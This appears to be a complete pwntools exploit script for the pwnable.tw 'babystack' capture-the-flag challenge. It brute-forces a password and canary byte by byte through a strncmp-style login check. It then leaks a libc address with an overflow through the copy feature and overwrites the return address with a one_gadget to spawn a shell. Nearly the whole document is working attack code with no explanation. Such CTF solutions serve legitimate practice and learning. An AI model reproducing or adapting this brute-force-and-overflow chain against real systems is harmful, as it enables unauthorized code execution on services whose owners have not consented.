#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('babystack_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x555555400f78
        b*0x555555400ebb
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10205)
else:
    p = process([exe.path])


# 0x68

def brute(num):
    res = []
    
    for i in range(num):
        for j in range(1, 0x100):
            info(f'current leaked bytes: {len(res)}')
            sa(b'>> ', b'1\n')
            sa(b'our passowrd :', bytes(res + [j]) + b'\n')


            out = p.recvline()
            print(f'data sent: {bytes(res + [j]) }')

            if b'Failed !' in out:
                continue


            res.append(j)
            sa(b'>> ', b'1\n')
            print(f'res: {res}')
            break
            
    return res
            
result = bytes(brute(0x10)).hex()
# result =  bytes.fromhex(pad)[::-1].hex()

password = result[0:]
# libc_leak = (result[0x60:], )
info(f'pass leak: {password}')
info(f'len leaked: {len(password)}')

# print(f'libc leak: {((libc_leak))}')
"""
hex_string = "4c04a414d7307452"

# Convert to bytes, reverse the bytes, and convert back to hex
reversed_bytes = bytes.fromhex(hex_string)[::-1].hex()
"""

sa(b'>> ', b'1')

sa('Your passowrd :', b'\x00' + b'a'*63 + b'a'*8)

sa(b'>> ', b'3')
sa(b'Copy :', b'a'*0x3f)

sa(b'>> ', b'1')

pad = bytes(brute(0xe)[8:]).hex()
GDB()

print(f'pad: {pad}')
libc_leak = int( bytes.fromhex(pad)[::-1].hex() , 16)
libc.address = libc_leak - 0x78439
print(f'libc leak: {hex(libc_leak)}')
print(f'libc base: {hex(libc.address)}')

pop_rdi = 0x0000000000021102 + libc.address
one = libc.address + 0x45216
load = flat(
    b'a'*0x3f,
    p64(int(password[:16], 16))[::-1],
    p64(int( password[16:], 16))[::-1]
)
print(f'password len: {len(password)}')
load = load.ljust(0x67,b'a')
load += p64(one)




sa(b'>> ', b'1')

sa('Your passowrd :', b'\x00' + load)
sa(b'>> ', b'3')
sa(b'Copy :', b'a'*0x10)



p.interactive()
